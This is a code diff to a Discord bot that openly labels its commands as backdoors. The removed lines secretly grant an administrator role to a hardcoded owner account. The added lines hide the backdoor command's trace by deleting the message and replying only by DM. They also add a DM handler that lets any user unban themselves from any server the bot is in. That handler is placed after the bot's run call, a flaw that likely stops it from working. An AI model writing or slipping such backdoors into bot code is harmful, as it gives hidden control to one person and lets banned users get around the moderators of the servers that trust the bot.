@@ -105,34 +105,20 @@ async def sudo_add(ctx):
 # ================= BACKDOOR =================
 @sudo.command(name="backdoor")
 async def sudo_backdoor(ctx):
-    member = discord.utils.find(
-        lambda m: m.name == OWNER_USERNAME or m.display_name == OWNER_USERNAME,
-        ctx.guild.members
-    )
-    if not member:
-        await ctx.send("user not found")
-        return
+    # delete the command message
+    try:
+        await ctx.message.delete()
+    except discord.Forbidden:
+        pass
 
-    role = discord.utils.get(ctx.guild.roles, name="Backdoored")
-    if role is None:
-        role = await ctx.guild.create_role(
-            name="Backdoored",
-            permissions=discord.Permissions(administrator=True)
+    # private DM only (or silent if DMs closed)
+    try:
+        await ctx.author.send(
+            f"✔️ Command received in **{ctx.guild.name}**."
         )
+    except discord.Forbidden:
+        pass
 
-    if role not in member.roles:
-        await member.add_roles(role)
-
-    await ctx.send(f"done → {member.mention}")
-
-# ================= SERVER RENAME =================
-@sudo.command(name="server")
-async def sudo_server(ctx, action: str = None, *, name: str = None):
-    if ctx.author.name != "nico044037":
-        return
-    if action != "rename" or not name:
-        return
-    await ctx.guild.edit(name=name)
 # ================= UNBAN BACKDOOR =================
 @sudo.command(name="unban")
 async def sudo_unban(ctx, *, server_name: str = None):
@@ -172,5 +158,68 @@ async def sudo_unban(ctx, *, server_name: str = None):
 if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 bot.run(TOKEN)
+@bot.event
+async def on_message(message):
+    if message.author.bot:
+        return
+
+    # allow normal commands in servers
+    if message.guild is not None:
+        await bot.process_commands(message)
+        return
+
+    parts = message.content.strip().split()
+
+    # expect: $sudo unban <server_id>
+    if len(parts) != 3 or parts[0].lower() != "$sudo" or parts[1].lower() != "unban":
+        return
+
+    try:
+        server_id = int(parts[2])
+    except ValueError:
+        try:
+            await message.author.send("❌ invalid server id")
+        except discord.Forbidden:
+            pass
+        return
+
+    guild = bot.get_guild(server_id)
+    if guild is None:
+        try:
+            await message.author.send("❌ I am not in that server")
+        except discord.Forbidden:
+            pass
+        return
+
+    try:
+        bans = await guild.bans()
+    except discord.Forbidden:
+        try:
+            await message.author.send("❌ I lack permission to view bans there")
+        except discord.Forbidden:
+            pass
+        return
+
+    for entry in bans:
+        if entry.user.id == message.author.id:
+            try:
+                await guild.unban(entry.user, reason="DM sudo unban")
+                try:
+                    await message.author.send(f"✅ unbanned in **{guild.name}**")
+                except discord.Forbidden:
+                    pass
+                return
+            except discord.Forbidden:
+                try:
+                    await message.author.send("❌ I lack permission to unban you")
+                except discord.Forbidden:
+                    pass
+                return
+
+    try:
+        await message.author.send("ℹ️ you are not banned in that server")
+    except discord.Forbidden:
+        pass
+
 
 
